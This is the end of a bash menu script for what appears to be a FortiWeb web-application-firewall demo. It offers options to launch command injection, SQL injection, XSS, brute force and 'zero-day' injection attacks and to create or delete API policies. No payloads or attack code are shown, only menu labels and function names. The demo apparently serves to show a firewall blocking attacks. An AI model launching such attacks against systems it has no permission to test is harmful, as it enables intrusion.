API_Create_Policy() {
    dos2unix -q api-create-policy.sh
	. "api-create-policy.sh"
    echo -n "Press enter to continue ... "
    read response
    return 1
}

API_Delete_Policy() {
    dos2unix -q api-delete-policy.sh
	. "api-delete-policy.sh"
    echo -n "Press enter to continue ... "
    read response
    return 1
}


############################################################################
## Exit Program
############################################################################

Exit() {
    return 0
}


################################
## Menu
################################

## Menu Item Text
##
## It makes sense to have "Exit" as the last item,
## as pressing Esc will jump to last item (and
## pressing Esc while on last item will perform the
## associated action).

menuItems=(
    "A. Vulnerability Scanner"
    "B. Command Injection"
    "C. SQL Injection"
    "D. Cookie Security"
    "E. Web Crawler with Wotbox"
    "F. Brute Force Attack"
    "G. Custom Request"
    "H. ML - 3000 POST requests - normal field input (learn)"
    "I. ML - 3000 POST requests - random field input (relearn)"
    "J. ML - Cross-site scripting"
    "K. ML - SQL Injection"
    "L. ML - Zero-Day Command Injection"
    "M. ML - Zero-Day SQL Injection"
    "N. REST API - create POLICY1 & POLICY2"
    "O. REST API - delete POLICY1 & POLICY2"
    "Q. Exit  "
)

## Menu Item Actions
menuActions=(
    Vulnerability_Scanner
    Exploit_CMDi_Attack
    Exploit_SQLi_Attack
    Cookie_Security
    Web_Crawler
    Brute_Force_Attack
    ML_Custom_Request
    ML_Learn_Parameters
    ML_Relearn_Parameters
    ML_Exploit_XSS
    ML_Exploit_SQLi
    ML_Exploit_ZeroDay_CMDi
    ML_Exploit_ZeroDay_SQLi
    API_Create_Policy
    API_Delete_Policy
    Exit
)

################################
## Menu Display
################################
menuTitle=" FortiWeb Demo - Last Update 29 March 2023"
menuFooter="Navigate via Up/Down/Letter, Enter to Select, Double Esc to Quit"
menuWidth=90
menuLeft=15
menuHighlight=$DRAW_COL_YELLOW


################################
## Run Menu
################################
initAll
menuInit
menuLoop

exit 0
